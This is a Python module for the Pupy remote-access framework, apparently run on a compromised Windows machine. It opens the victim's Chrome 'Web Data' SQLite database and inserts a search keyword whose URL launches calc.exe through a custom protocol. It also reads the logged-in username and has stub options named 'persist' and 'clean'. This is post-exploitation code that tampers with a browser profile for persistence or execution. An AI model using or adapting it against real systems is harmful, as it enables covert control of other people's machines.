# -*- coding: UTF8 -*-

# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from pupylib.PupyModule import *
import os
import StringIO
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="forensichatModule"

class forensichatModule(PupyModule):
	""" execute cleaning routines """
	@windows_only
	def is_compatible(self):
		pass

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='forensichat', description=self.__doc__)
		self.arg_parser.add_argument('-p', '--persist', help='run the persistance script')
		self.arg_parser.add_argument('-c', '--clean', help='run the cleaning script')

	def run(self, args):
		self.info("a")
		self.client.load_package("_sqlite3")
		self.client.load_package("sqlite3")
		print self.client.load_dll("packages/windows/x86/sqlite3.dll")
		
		
		self.client.conn.modules['_sqlite3']
		self.client.conn.modules['sqlite3']
		with redirected_stdio(self.client.conn): 

			self.con=self.client.conn.modules['sqlite3'].connect('C:\Users\steal\AppData\Local\Google\Chrome\User Data\Default\Web Data')
			print self.con
			self.info("connecting to web data db...")
			self.c = self.con.cursor()
			print self.c
			self.c.execute("SELECT * FROM keywords WHERE short_name='cleanupeverybodyeverywhere'")
			print self.c
			self.foo = self.c.fetchall()
			print self.foo
			if not self.foo:
				self.info("executing")
				self.c.execute("INSERT INTO keywords (short_name,keyword,url,favicon_url) VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','forensichat://C:>Windows>System32>calc.exe','')")
				self.con.commit()
			self.con.close()


		if args.clean:
			self.info("clean...")

		if args.persist:
			self.info("persist...")
		
		self.success("added browser")
		self.client.load_package("getpass")
		user=self.client.conn.modules['getpass'].getuser()
		self.info("USER: %s"%user)
